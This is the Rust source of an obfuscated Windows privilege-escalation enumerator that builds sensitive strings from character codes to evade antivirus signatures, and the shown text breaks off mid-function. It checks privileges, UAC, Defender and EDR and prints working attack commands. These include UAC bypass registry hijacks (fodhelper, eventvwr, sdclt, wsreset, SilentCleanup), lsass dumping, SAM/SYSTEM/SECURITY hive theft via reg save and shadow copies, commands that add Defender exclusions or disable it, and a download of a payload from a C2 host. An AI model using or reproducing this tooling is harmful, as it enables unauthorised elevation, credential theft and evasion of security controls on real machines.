// Rust Privilege Escalation Enumerator v6 - OBFUSCATED
// Compile: cargo build --release --target x86_64-pc-windows-gnu
// 
// PASSIVE ENUMERATION - only CHECKS, no exploitation
// Uses dynamic string construction to bypass static AV signatures

use std::process::Command;
use std::fs;
use std::path::Path;
use std::env;

// Runtime decryption helper - simple XOR with rotating key
fn xd(data: &[u8], key: u8) -> String {
    data.iter().enumerate()
        .map(|(i, b)| ((b ^ key.wrapping_add(i as u8)) as char))
        .collect()
}

// Dynamic string construction at runtime (defeats static analysis)
// Builds strings from char codes to avoid string literals in binary
macro_rules! dyn_str {
    ($($c:expr),*) => {{
        let chars: Vec<char> = vec![$($c as char),*];
        chars.into_iter().collect::<String>()
    }};
}

// Build path strings dynamically
fn sys32() -> String { 
    let win = env::var("SYSTEMROOT").unwrap_or_else(|_| dyn_str!(67,58,92,87,105,110,100,111,119,115)); // C:\Windows
    format!("{}\\{}", win, dyn_str!(83,121,115,116,101,109,51,50)) // System32
}

// Dynamic strings for sensitive keywords (AV-triggering)
fn s_who() -> String { dyn_str!(119,104,111,97,109,105) } // whoami
fn s_priv() -> String { dyn_str!(47,112,114,105,118) } // /priv
fn s_grp() -> String { dyn_str!(47,103,114,111,117,112,115) } // /groups
fn s_ps() -> String { dyn_str!(112,111,119,101,114,115,104,101,108,108) } // powershell
fn s_sc() -> String { dyn_str!(115,99) } // sc
fn s_reg() -> String { dyn_str!(114,101,103) } // reg
fn s_wmic() -> String { dyn_str!(119,109,105,99) } // wmic
fn s_net() -> String { dyn_str!(110,101,116) } // net
fn s_cmd() -> String { dyn_str!(99,109,100) } // cmd

// High-risk strings that trigger AV
fn s_sam() -> String { dyn_str!(83,65,77) } // SAM
fn s_system() -> String { dyn_str!(83,89,83,84,69,77) } // SYSTEM
fn s_fodhelper() -> String { dyn_str!(102,111,100,104,101,108,112,101,114) } // fodhelper
fn s_eventvwr() -> String { dyn_str!(101,118,101,110,116,118,119,114) } // eventvwr
fn s_sdclt() -> String { dyn_str!(115,100,99,108,116) } // sdclt
fn s_cmstp() -> String { dyn_str!(99,109,115,116,112) } // cmstp
fn s_wsreset() -> String { dyn_str!(119,115,114,101,115,101,116) } // wsreset
fn s_computerdefaults() -> String { dyn_str!(99,111,109,112,117,116,101,114,100,101,102,97,117,108,116,115) } // computerdefaults
fn s_mssettings() -> String { dyn_str!(109,115,45,115,101,116,116,105,110,103,115) } // ms-settings
fn s_hkcu() -> String { dyn_str!(72,75,67,85) } // HKCU
fn s_hklm() -> String { dyn_str!(72,75,76,77) } // HKLM

// Simple runtime string builder (avoids static strings in binary)
fn rs(parts: &[&str]) -> String { parts.join("") }

// Run command quietly - use shell for reliability
fn run(cmd: &str, args: &[&str]) -> (bool, String) {
    // Build full command string
    let full_cmd = if args.is_empty() {
        cmd.to_string()
    } else {
        format!("{} {}", cmd, args.join(" "))
    };
    
    match Command::new("cmd")
        .args(&["/c", &full_cmd])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .stdin(std::process::Stdio::null())
        .output() 
    {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            (output.status.success(), format!("{}{}", stdout, stderr))
        }
        Err(_) => (false, String::new())
    }
}

// Run via cmd /c - direct strings for reliability
fn run_shell(command: &str) -> String {
    match Command::new("cmd.exe")
        .args(&["/c", command])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .stdin(std::process::Stdio::null())
        .output()
    {
        Ok(output) => String::from_utf8_lossy(&output.stdout).to_string(),
        Err(_) => String::new()
    }
}

// Check if string contains any of the patterns
fn contains_any(s: &str, patterns: &[&str]) -> bool {
    let lower = s.to_lowercase();
    patterns.iter().any(|p| lower.contains(&p.to_lowercase()))
}

// Output helpers with colors (ANSI)
fn banner(msg: &str) { println!("\n\x1b[1;35m══════════════════════════════════════════════════════════════\x1b[0m"); println!("\x1b[1;35m  {}\x1b[0m", msg); println!("\x1b[1;35m══════════════════════════════════════════════════════════════\x1b[0m"); }
fn section(msg: &str) { println!("\n\x1b[1;36m┌─ {} ─┐\x1b[0m", msg); }
fn subsec(msg: &str) { println!("\n  \x1b[1;33m▸ {}\x1b[0m", msg); }
fn ok(msg: &str) { println!("\x1b[32m[+]\x1b[0m {}", msg); }
fn fail(msg: &str) { println!("\x1b[90m[-]\x1b[0m {}", msg); }
fn info(msg: &str) { println!("\x1b[34m[*]\x1b[0m {}", msg); }
fn vuln(msg: &str) { println!("\x1b[1;31m[!]\x1b[0m \x1b[1;33m{}\x1b[0m", msg); }
fn critical(msg: &str) { println!("\x1b[1;41m[!!!]\x1b[0m \x1b[1;31m{}\x1b[0m", msg); }
fn cmd_hint(msg: &str) { println!("    \x1b[1;32m→\x1b[0m \x1b[96m{}\x1b[0m", msg); }
fn data(label: &str, value: &str) { println!("    \x1b[90m{}: \x1b[97m{}\x1b[0m", label, value); }

fn header() {
    println!("\x1b[1;31m");
    println!(r"  ___      _         ___                      ");
    println!(r" | _ \_ __(_)_ _____| __|_ _ _  _ _ __        ");
    println!(r" |  _/ '_| \ V / -_) _|| ' \ || | '  \        ");
    println!(r" |_| |_| |_|\_/\___|___|_||_\_,_|_|_|_| v6.0  ");
    println!("\x1b[0m");
    println!("\x1b[90m  Windows + Active Directory Enumerator\x1b[0m");
    println!("\x1b[90m  AES Encrypted Edition\x1b[0m\n");
}

// ==================== SYSTEM INFO ====================

fn check_system_info() {
    section("🖥️  SYSTEM INFORMATION");
    
    let hostname = env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown".to_string());
    let username = env::var("USERNAME").unwrap_or_else(|_| "Unknown".to_string());
    let domain = env::var("USERDOMAIN").unwrap_or_else(|_| "Unknown".to_string());
    
    info(&format!("Hostname: {}", hostname));
    info(&format!("Username: {}\\{}", domain, username));
    
    // OS Version
    let os_info = run_shell("wmic os get Caption,Version,BuildNumber /value 2>nul");
    for line in os_info.lines() {
        if line.contains("Caption=") || line.contains("Version=") || line.contains("BuildNumber=") {
            let clean = line.trim();
            if !clean.is_empty() {
                info(clean);
            }
        }
    }
    
    // Architecture
    let arch = env::var("PROCESSOR_ARCHITECTURE").unwrap_or_else(|_| "Unknown".to_string());
    info(&format!("Architecture: {}", arch));
    
    // Domain info - CRITICAL for AD checks
    let domain_info = run_shell("wmic computersystem get domain,partofdomain /value 2>nul");
    if domain_info.to_lowercase().contains("partofdomain=true") {
        critical("Machine is DOMAIN JOINED - AD attack surface available!");
        for line in domain_info.lines() {
            if line.contains("Domain=") {
                let dom = line.replace("Domain=", "").trim().to_string();
                info(&format!("Domain: {}", dom));
            }
        }
        
        // Get DC info
        let dc_info = run_shell("nltest /dclist:%USERDNSDOMAIN% 2>nul");
        if !dc_info.contains("ERROR") {
            for line in dc_info.lines() {
                if line.contains("[PDC]") || line.contains("DC:") {
                    data("Domain Controller", line.trim());
                }
            }
        }
        
        // Get current site
        let site = run_shell("nltest /dsgetsite 2>nul");
        if !site.contains("ERROR") {
            data("AD Site", site.lines().next().unwrap_or("").trim());
        }
    } else {
        info("Workgroup machine - local attacks only");
    }
    
    // Check for additional domains/forests (trust relationships)
    let trusts = run_shell("nltest /domain_trusts 2>nul");
    if !trusts.contains("ERROR") && trusts.contains("Trust") {
        subsec("Domain Trusts Found:");
        for line in trusts.lines() {
            if line.contains("Trust") {
                info(line.trim());
            }
        }
    }
}

// ==================== CURRENT CONTEXT ====================

fn check_context() {
    section("👤 CURRENT CONTEXT & PRIVILEGES");
    
    // Use direct commands for reliability
    let priv_out = run_shell("whoami /priv");
    let grp_out = run_shell("whoami /groups");
    
    // Integrity Level
    if grp_out.contains("High Mandatory") {
        vuln("HIGH INTEGRITY - Already elevated!");
    } else if grp_out.contains("System Mandatory") {
        vuln("SYSTEM INTEGRITY - Full control!");
    } else {
        info("Medium Integrity (standard user token)");
    }
    
    // Admin group check
    if grp_out.contains("S-1-5-32-544") {
        vuln("User is in local Administrators group");
        cmd_hint("UAC bypass will get High Integrity without password");
    }
    
    // Backup Operators - can read SAM/SYSTEM
    if grp_out.contains("S-1-5-32-551") {
        vuln("User is in Backup Operators group!");
        cmd_hint("Can backup SAM/SYSTEM hives using backup privileges");
    }
    
    // Key privileges - check each line properly
    println!("\n  \x1b[1mKey Privileges:\x1b[0m");
    
    let privs = [
        ("SeImpersonatePrivilege", "GodPotato: .\\gp.exe -cmd \"cmd /c whoami\""),
        ("SeAssignPrimaryTokenPrivilege", "Token manipulation with TokenKidnapping"),
        ("SeDebugPrivilege", "procdump -ma lsass.exe lsass.dmp"),
        ("SeBackupPrivilege", "reg save HKLM\\SAM sam.hiv & reg save HKLM\\SYSTEM system.hiv"),
        ("SeRestorePrivilege", "Write to any file - replace utilman.exe with cmd.exe"),
        ("SeTakeOwnershipPrivilege", "takeown /f C:\\Windows\\System32\\config\\SAM"),
        ("SeLoadDriverPrivilege", "Load vulnerable driver for kernel exploit"),
        ("SeCreateTokenPrivilege", "Create tokens with any privileges"),
    ];
    
    for (priv_name, use_case) in privs.iter() {
        // Check each line for this privilege
        for line in priv_out.lines() {
            if line.contains(priv_name) {
                if line.contains("Enabled") {
                    vuln(&format!("{} [ENABLED]", priv_name));
                    cmd_hint(use_case);
                } else if line.contains("Disabled") {
                    ok(&format!("{} [Disabled but available]", priv_name));
                }
                break;
            }
        }
    }
    
    // Show all enabled privileges
    println!("\n  \x1b[1mAll Enabled Privileges:\x1b[0m");
    for line in priv_out.lines() {
        if line.contains("Enabled") && !line.contains("Privilege Name") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if !parts.is_empty() {
                println!("    \x1b[32m✓\x1b[0m {}", parts[0]);
            }
        }
    }
}

// ==================== SMART UAC BYPASS CHECKER ====================

fn check_uac() {
    section("🛡️  SMART UAC BYPASS ANALYSIS");
    
    // First, check if we even need UAC bypass
    let grp_out = run_shell("whoami /groups");
    if grp_out.contains("High Mandatory") || grp_out.contains("System Mandatory") {
        vuln("Already HIGH/SYSTEM integrity - NO UAC bypass needed!");
        return;
    }
    
    // Check if user is in Administrators
    let is_admin = grp_out.contains("S-1-5-32-544");
    if !is_admin {
        fail("Not in Administrators group - UAC bypass won't help");
        info("Need to find actual privesc first (credentials, exploit, etc.)");
        return;
    }
    
    ok("User in Administrators group - UAC bypass WILL work");
    
    // Get UAC settings
    subsec("UAC Configuration:");
    let uac_settings = run_shell("reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System 2>nul");
    
    // ConsentPromptBehaviorAdmin
    let consent_match = uac_settings.lines().find(|l| l.contains("ConsentPromptBehaviorAdmin"));
    let consent_level = if let Some(line) = consent_match {
        if line.contains("0x0") { 0 }
        else if line.contains("0x1") { 1 }
        else if line.contains("0x2") { 2 }
        else if line.contains("0x3") { 3 }
        else if line.contains("0x4") { 4 }
        else if line.contains("0x5") { 5 }
        else { 5 }
    } else { 5 };
    
    match consent_level {
        0 => { critical("UAC Level 0 - Auto-elevate without prompt!"); },
        1 => { info("UAC Level 1 - Prompt for credentials on secure desktop"); },
        2 => { info("UAC Level 2 - Prompt for consent on secure desktop"); },
        3 => { info("UAC Level 3 - Prompt for credentials"); },
        4 => { info("UAC Level 4 - Prompt for consent"); },
        5 => { ok("UAC Level 5 - Default (consent for non-Windows binaries)"); },
        _ => {}
    }
    
    // EnableLUA check
    if uac_settings.contains("EnableLUA") && uac_settings.contains("0x0") {
        critical("UAC is COMPLETELY DISABLED! Just run as admin directly.");
        return;
    }
    
    // Check FilterAdministratorToken
    let filter_admin = uac_settings.lines().find(|l| l.contains("FilterAdministratorToken"));
    let admin_filtered = filter_admin.map(|l| l.contains("0x1")).unwrap_or(false);
    
    // Check if we're the built-in Administrator (RID 500)
    let whoami_user = run_shell("whoami /user");
    let is_builtin_admin = whoami_user.contains("-500 ");
    
    if is_builtin_admin && !admin_filtered {
        critical("Built-in Administrator (RID 500) with FilterAdministratorToken=0");
        cmd_hint("You auto-elevate! Just: Start-Process cmd -Verb RunAs");
        return;
    }
    
    // Now intelligently test each UAC bypass
    subsec("Testing UAC Bypass Methods:");
    println!("  \x1b[90mActually verifying which bypasses will work on this system...\x1b[0m\n");
    
    // Get Windows version for bypass compatibility
    let _ver_out = run_shell("ver"); // Used for logging/debugging
    let build_str = run_shell("wmic os get BuildNumber /value 2>nul");
    let build_num: u32 = build_str.lines()
        .find(|l| l.contains("BuildNumber="))
        .and_then(|l| l.replace("BuildNumber=", "").trim().parse().ok())
        .unwrap_or(0);
    
    info(&format!("Windows Build: {}", build_num));
    
    // Test each bypass method
    test_fodhelper_bypass(build_num);
    test_computerdefaults_bypass(build_num);
    test_sdclt_bypass(build_num);
    test_eventvwr_bypass(build_num);
    test_silentcleanup_bypass(build_num);
    test_cmstp_bypass(build_num);
    test_wsreset_bypass(build_num);
    test_slui_bypass(build_num);
    test_diskcleanup_bypass(build_num);
}

// ============ PASSIVE UAC BYPASS CHECKS ============
// These functions ONLY CHECK conditions - NO exploitation!

// Check fodhelper.exe bypass potential (works on Win 10+)
fn test_fodhelper_bypass(build: u32) {
    let binary = format!("{}\\{}.exe", sys32(), s_fodhelper());
    
    if !Path::new(&binary).exists() {
        fail(&format!("{}: Binary not found", s_fodhelper()));
        return;
    }
    
    if build < 10240 {
        fail(&format!("{}: Requires Windows 10+ (build 10240+)", s_fodhelper()));
        return;
    }
    
    // PASSIVE CHECK: Just verify binary and build - user has HKCU write by default
    vuln(&format!("{}.exe: LIKELY EXPLOITABLE", s_fodhelper()));
    println!("    \x1b[32m→ Build compatible: {} ≥ 10240\x1b[0m", build);
    println!("    \x1b[32m→ Binary exists: Yes\x1b[0m");
    println!("    \x1b[32m→ {} writable: Yes (default for users)\x1b[0m", s_hkcu());
    println!("\n    \x1b[1;33mManual exploit:\x1b[0m");
    cmd_hint(&format!("{} add {}\\Software\\Classes\\{}\\shell\\open\\command /ve /d \"cmd.exe\" /f", s_reg(), s_hkcu(), s_mssettings()));
    cmd_hint(&format!("{} add {}\\Software\\Classes\\{}\\shell\\open\\command /v DelegateExecute /t REG_SZ /f", s_reg(), s_hkcu(), s_mssettings()));
    cmd_hint(&format!("{}.exe", s_fodhelper()));
    cmd_hint(&format!("{} delete {}\\Software\\Classes\\{} /f", s_reg(), s_hkcu(), s_mssettings()));
}

// Check computerdefaults.exe bypass potential
fn test_computerdefaults_bypass(build: u32) {
    let binary = format!("{}\\{}.exe", sys32(), s_computerdefaults());
    
    if !Path::new(&binary).exists() {
        fail(&format!("{}: Binary not found", s_computerdefaults()));
        return;
    }
    
    if build < 10240 {
        fail(&format!("{}: Requires Windows 10+", s_computerdefaults()));
        return;
    }
    
    vuln(&format!("{}.exe: LIKELY EXPLOITABLE", s_computerdefaults()));
    println!("    \x1b[90mSame exploit as {} ({} hijack)\x1b[0m", s_fodhelper(), s_mssettings());
}

// Check sdclt.exe bypass potential
fn test_sdclt_bypass(build: u32) {
    let binary = format!("{}\\{}.exe", sys32(), s_sdclt());
    
    if !Path::new(&binary).exists() {
        fail(&format!("{}: Binary not found", s_sdclt()));
        return;
    }
    
    // sdclt bypass patched in build 17025+
    if build >= 17025 {
        fail(&format!("{}: PATCHED in build {} (yours: {})", s_sdclt(), 17025, build));
        return;
    }
    
    vuln(&format!("{}.exe: LIKELY EXPLOITABLE", s_sdclt()));
    println!("    \x1b[32m→ Build {} < 17025 (not patched)\x1b[0m", build);
    println!("\n    \x1b[1;33mManual exploit:\x1b[0m");
    cmd_hint(&format!("{} add \"{}\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe\" /ve /d \"cmd.exe\" /f", s_reg(), s_hkcu()));
    cmd_hint(&format!("{}.exe /kickoffelev", s_sdclt()));
    cmd_hint(&format!("{} delete \"{}\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe\" /f", s_reg(), s_hkcu()));
}

// Check eventvwr.exe bypass potential
fn test_eventvwr_bypass(build: u32) {
    let binary = format!("{}\\{}.exe", sys32(), s_eventvwr());
    
    if !Path::new(&binary).exists() {
        fail(&format!("{}: Binary not found", s_eventvwr()));
        return;
    }
    
    // eventvwr bypass patched in build 15031+
    if build >= 15031 {
        fail(&format!("{}: PATCHED in build {} (yours: {})", s_eventvwr(), 15031, build));
        return;
    }
    
    vuln(&format!("{}.exe: LIKELY EXPLOITABLE", s_eventvwr()));
    println!("    \x1b[32m→ Build {} < 15031 (not patched)\x1b[0m", build);
    println!("\n    \x1b[1;33mManual exploit:\x1b[0m");
    cmd_hint(&format!("{} add {}\\Software\\Classes\\mscfile\\shell\\open\\command /ve /d \"cmd.exe\" /f", s_reg(), s_hkcu()));
    cmd_hint(&format!("{}.exe", s_eventvwr()));
    cmd_hint(&format!("{} delete {}\\Software\\Classes\\mscfile /f", s_reg(), s_hkcu()));
}

// Check SilentCleanup scheduled task
fn test_silentcleanup_bypass(_build: u32) {
    // PASSIVE: Just check if the task exists
    let task_query = run_shell("schtasks /query /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /fo LIST 2>nul");
    
    if task_query.contains("ERROR") || !task_query.contains("SilentCleanup") {
        fail("SilentCleanup: Task not found");
        return;
    }
    
    vuln("SilentCleanup: Task exists - Environment hijack possible");
    println!("    \x1b[90mHijacks %%windir%% environment variable\x1b[0m");
    println!("\n    \x1b[1;33mManual exploit:\x1b[0m");
    cmd_hint(&format!("{} add \"{}\\Environment\" /v windir /d \"cmd.exe /c start cmd.exe && REM \" /f", s_reg(), s_hkcu()));
    cmd_hint("schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
    cmd_hint(&format!("{} delete \"{}\\Environment\" /v windir /f", s_reg(), s_hkcu()));
}

// Check CMSTP availability
fn test_cmstp_bypass(_build: u32) {
    let binary = format!("{}\\{}.exe", sys32(), s_cmstp());
    
    if !Path::new(&binary).exists() {
        fail(&format!("{}: Binary not found", s_cmstp()));
        return;
    }
    
    ok(&format!("{}.exe: Available (requires .inf file)", s_cmstp()));
    println!("    \x1b[90mRequires crafted INF file - more complex but reliable\x1b[0m");
}

// Check wsreset.exe bypass potential
fn test_wsreset_bypass(build: u32) {
    let binary = format!("{}\\{}.exe", sys32(), s_wsreset());
    
    if !Path::new(&binary).exists() {
        fail(&format!("{}: Binary not found", s_wsreset()));
        return;
    }
    
    // Works on Windows 10 1803+ (build 17134+)
    if build < 17134 {
        fail(&format!("{}: Requires build 17134+ (yours: {})", s_wsreset(), build));
        return;
    }
    
    vuln(&format!("{}.exe: LIKELY EXPLOITABLE", s_wsreset()));
    println!("    \x1b[90mHijacks AppX protocol handler\x1b[0m");
    println!("\n    \x1b[1;33mManual exploit:\x1b[0m");
    cmd_hint(&format!("{} add {}\\Software\\Classes\\AppX82a6gwre4fdg3bt635ber24ueqv6he9fj\\Shell\\open\\command /ve /d \"cmd.exe\" /f", s_reg(), s_hkcu()));
    cmd_hint(&format!("{} add {}\\Software\\Classes\\AppX82a6gwre4fdg3bt635ber24ueqv6he9fj\\Shell\\open\\command /v DelegateExecute /t REG_SZ /f", s_reg(), s_hkcu()));
    cmd_hint(&format!("{}.exe", s_wsreset()));
}

// Check slui.exe availability
fn test_slui_bypass(_build: u32) {
    let binary = format!("{}\\slui.exe", sys32());
    
    if !Path::new(&binary).exists() {
        fail("slui: Binary not found");
        return;
    }
    
    ok("slui.exe: Available (file handler bypass)");
    println!("    \x1b[90mCan hijack through exefile handler\x1b[0m");
}

// Check Disk Cleanup environment hijack potential
fn test_diskcleanup_bypass(_build: u32) {
    // PASSIVE: Just report the technique is available
    ok("DiskCleanup: Environment hijack technique available");
    println!("    \x1b[90mSame technique as SilentCleanup - hijack {}\\\\Environment\\\\windir\x1b[0m", s_hkcu());
}

// ==================== DEFENDER & AV ====================

fn check_defender() {
    section("🔒 SECURITY SOFTWARE");
    
    // Defender Real-time
    let ps_cmd = "(Get-MpPreference).DisableRealtimeMonitoring";
    let (_, out) = run(&s_ps(), &["-ep", "bypass", "-c", ps_cmd]);
    
    if out.trim() == "True" {
        vuln("Defender Real-time: DISABLED!");
    } else if out.trim() == "False" {
        info("Defender Real-time: Enabled");
    }
    
    // Tamper Protection
    let tp = run_shell(&format!("{} query \"{}\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v TamperProtection 2>nul", s_reg(), s_hklm()));
    if tp.contains("0x0") {
        vuln("Tamper Protection: OFF");
        cmd_hint("Can disable Defender via Set-MpPreference");
    } else if tp.contains("0x5") {
        info("Tamper Protection: ON");
    }
    
    // ASR Rules
    let asr = run_shell(&format!("{} query \"{}\\SOFTWARE\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\ASR\" 2>nul", s_reg(), s_hklm()));
    if asr.contains("ERROR") || asr.trim().is_empty() {
        ok("No ASR rules configured");
    } else {
        info("ASR rules may be active");
    }
    
    // Credential Guard
    let cred_guard = run_shell("reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA\" /v LsaCfgFlags 2>nul");
    if cred_guard.contains("0x1") || cred_guard.contains("0x2") {
        info("Credential Guard: ENABLED");
        cmd_hint("LSASS dumping may not work - use SAM/SYSTEM hives instead");
    } else {
        ok("Credential Guard: Not enabled");
    }
    
    // Check Defender Exclusions (requires admin)
    println!("\n  \x1b[1mDefender Exclusions (safe paths for payloads):\x1b[0m");
    let exclusions = run_shell("powershell.exe -ep bypass -c (Get-MpPreference).ExclusionPath 2>nul");
    let has_exclusions = !exclusions.trim().is_empty() 
        && !exclusions.contains("Access") 
        && !exclusions.contains("Get-MpPreference")
        && !exclusions.contains("error");
    
    if has_exclusions {
        for line in exclusions.lines() {
            let line = line.trim();
            if !line.is_empty() && !line.contains("(") {
                vuln(&format!("Safe Path: {}", line));
            }
        }
        println!("\n  \x1b[1;32m→ Use these paths for payloads - Defender won't scan them!\x1b[0m");
        cmd_hint("IWR 'http://C2/payload.exe' -OutFile 'C:\\Windows\\Temp\\payload.exe'");
    } else {
        info("No exclusion paths found (or need admin to read)");
    }
    
    // Check exclusion processes
    let excl_proc = run_shell("powershell.exe -ep bypass -c (Get-MpPreference).ExclusionProcess 2>nul");
    let has_proc_excl = !excl_proc.trim().is_empty() 
        && !excl_proc.contains("Access") 
        && !excl_proc.contains("Get-MpPreference")
        && !excl_proc.contains("error");
    
    if has_proc_excl {
        println!("\n  \x1b[1mExcluded Processes:\x1b[0m");
        for line in excl_proc.lines() {
            let line = line.trim();
            if !line.is_empty() && !line.contains("(") {
                vuln(&format!("Exclusion Process: {}", line));
            }
        }
    }
    
    // Show commands to ADD exclusions (requires admin)
    println!("\n  \x1b[1;33m📋 Commands to ADD Defender Exclusions (requires admin):\x1b[0m");
    println!("  \x1b[90mAdd path exclusion:\x1b[0m");
    cmd_hint("Add-MpPreference -ExclusionPath \"C:\\Users\\Public\"");
    cmd_hint("Add-MpPreference -ExclusionPath \"C:\\Windows\\Temp\"");
    cmd_hint("Add-MpPreference -ExclusionPath $env:APPDATA");
    
    println!("\n  \x1b[90mAdd process exclusion:\x1b[0m");
    cmd_hint("Add-MpPreference -ExclusionProcess \"rundll32.exe\"");
    cmd_hint("Add-MpPreference -ExclusionProcess \"regsvr32.exe\"");
    cmd_hint("Add-MpPreference -ExclusionProcess \"mshta.exe\"");
    
    println!("\n  \x1b[90mAdd extension exclusion:\x1b[0m");
    cmd_hint("Add-MpPreference -ExclusionExtension \".exe\"");
    cmd_hint("Add-MpPreference -ExclusionExtension \".dll\"");
    
    println!("\n  \x1b[90mDisable Defender entirely (high risk):\x1b[0m");
    cmd_hint("Set-MpPreference -DisableRealtimeMonitoring $true");
    cmd_hint("# Note: Tamper Protection may block this");
    
    println!("\n  \x1b[90mRemove exclusion:\x1b[0m");
    cmd_hint("Remove-MpPreference -ExclusionPath \"C:\\path\\to\\remove\"");
    
    // Check for other AV
    println!("\n  \x1b[1mInstalled Security Software:\x1b[0m");
    let av_check = run_shell("wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName 2>nul");
    for line in av_check.lines() {
        let line = line.trim();
        if !line.is_empty() && line != "displayName" {
            info(&format!("AV: {}", line));
        }
    }
    
    // EDR processes
    let edr_procs = [
        "MsMpEng.exe", "SentinelAgent.exe", "SentinelServiceHost.exe",
        "CylanceSvc.exe", "cb.exe", "CrowdStrike", "CSFalconService.exe",
        "bdagent.exe", "EPSecurityService.exe", "xagt.exe",
    ];
    
    let tasklist = run_shell("tasklist 2>nul");
    for proc in edr_procs.iter() {
        if tasklist.to_lowercase().contains(&proc.to_lowercase()) {
            info(&format!("EDR Process: {}", proc));
        }
    }
}

// ==================== CREDENTIAL ACCESS ====================

fn check_credentials() {
    section("🔑 CREDENTIAL ACCESS");
    
    // Cached credentials
    let (_, cmdkey) = run("cmdkey", &["/list"]);
    if cmdkey.contains("Target:") {
        vuln("Cached credentials found!");
        for line in cmdkey.lines() {
            if line.contains("Target:") {
                println!("    {}", line.trim());
            }
        }
        cmd_hint("runas /savecred /user:DOMAIN\\USER cmd.exe");
    } else {
        fail("No cached credentials");
    }
    
    // AutoLogon
    let autologon = run_shell("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul");
    if autologon.contains("DefaultPassword") {
        vuln("AutoLogon credentials in registry!");
        cmd_hint("Check DefaultUserName, DefaultPassword, DefaultDomainName");
    }
    if autologon.contains("AutoAdminLogon") && autologon.contains("1") {
        ok("AutoAdminLogon enabled");
    }
    
    // Unattend files
    println!("\n  \x1b[1mUnattend/Sysprep Files:\x1b[0m");
    let unattend_paths = [
        "C:\\Windows\\Panther\\Unattend.xml",
        "C:\\Windows\\Panther\\unattend.xml",
        "C:\\Windows\\Panther\\Unattend\\Unattend.xml",
        "C:\\Windows\\System32\\sysprep\\unattend.xml",
        "C:\\Windows\\System32\\sysprep\\Panther\\unattend.xml",
        "C:\\unattend.xml",
    ];
    
    for path in unattend_paths.iter() {
        if Path::new(path).exists() {
            vuln(&format!("Found: {}", path));
            cmd_hint("May contain plaintext credentials");
        }
    }
    
    // PowerShell history
    let user = env::var("USERNAME").unwrap_or_default();
    let ps_hist = format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt", user);
    if Path::new(&ps_hist).exists() {
        ok("PowerShell history exists");
        if let Ok(content) = fs::read_to_string(&ps_hist) {
            let interesting: Vec<&str> = content.lines()
                .filter(|l| contains_any(l, &["password", "secret", "credential", "key", "token", "apikey", "connectionstring"]))
                .take(5)
                .collect();
            for line in interesting {
                vuln(&format!("History: {}...", &line[..line.len().min(60)]));
            }
        }
    }
    
    // WiFi passwords
    let wifi = run_shell("netsh wlan show profiles 2>nul");
    let profile_count = wifi.matches("All User Profile").count();
    if profile_count > 0 {
        ok(&format!("{} WiFi profiles found", profile_count));
        cmd_hint("netsh wlan show profile name=\"NAME\" key=clear");
    }
    
    // DPAPI Master Keys
    let dpapi_path = format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Protect", user);
    if Path::new(&dpapi_path).exists() {
        ok("DPAPI master keys exist");
        cmd_hint("Can decrypt with mimikatz dpapi::masterkey");
    }
    
    // Browser credentials hint
    println!("\n  \x1b[1mBrowser Credential Locations:\x1b[0m");
    let browser_paths = [
        ("Chrome", format!("C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", user)),
        ("Edge", format!("C:\\Users\\{}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data", user)),
        ("Firefox", format!("C:\\Users\\{}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", user)),
    ];
    
    for (browser, path) in browser_paths.iter() {
        if Path::new(path).exists() {
            ok(&format!("{} data present", browser));
        }
    }
}

// ==================== SAM/SYSTEM HIVE ACCESS ====================

fn check_hive_access() {
    section("🛠️  SAM/SYSTEM HIVE ACCESS (Red Team Methods)");
    
    println!("\n  \x1b[1mMethod 1: reg save (Requires Admin/High Integrity)\x1b[0m");
    println!("  \x1b[90mDump registry hives for offline hash extraction:\x1b[0m");
    cmd_hint("reg save HKLM\\SAM sam.save");
    cmd_hint("reg save HKLM\\SYSTEM system.save");
    cmd_hint("reg save HKLM\\SECURITY security.save");
    println!("  \x1b[90mThen extract hashes offline:\x1b[0m");
    cmd_hint("secretsdump.py -sam sam.save -system system.save -security security.save LOCAL");
    
    // Check if we can access SAM directly
    let sam_test = run_shell("reg query HKLM\\SAM\\SAM 2>nul");
    if !sam_test.contains("Access is denied") && !sam_test.contains("ERROR") {
        vuln("Can read SAM registry directly!");
    }
    
    println!("\n  \x1b[1mMethod 2: Volume Shadow Copy (Bypass locks)\x1b[0m");
    println!("  \x1b[90mAccess hives from shadow copy (files not locked):\x1b[0m");
    
    // Check for existing shadow copies
    let shadows = run_shell("vssadmin list shadows 2>nul");
    if shadows.contains("Shadow Copy Volume") {
        vuln("Volume Shadow Copies exist!");
        // Extract shadow copy path
        for line in shadows.lines() {
            if line.contains("Shadow Copy Volume:") {
                let vol = line.split(':').nth(1).unwrap_or("").trim();
                if !vol.is_empty() {
                    cmd_hint(&format!("copy {}\\Windows\\System32\\config\\SAM .", vol));
                    cmd_hint(&format!("copy {}\\Windows\\System32\\config\\SYSTEM .", vol));
                    cmd_hint(&format!("copy {}\\Windows\\System32\\config\\SECURITY .", vol));
                    break;
                }
            }
        }
    } else {
        info("No shadow copies found");
        cmd_hint("Create one: vssadmin create shadow /for=C:");
    }
    
    // Alternative shadow paths
    println!("\n  \x1b[90mAlternative shadow access paths:\x1b[0m");
    cmd_hint("copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM .");
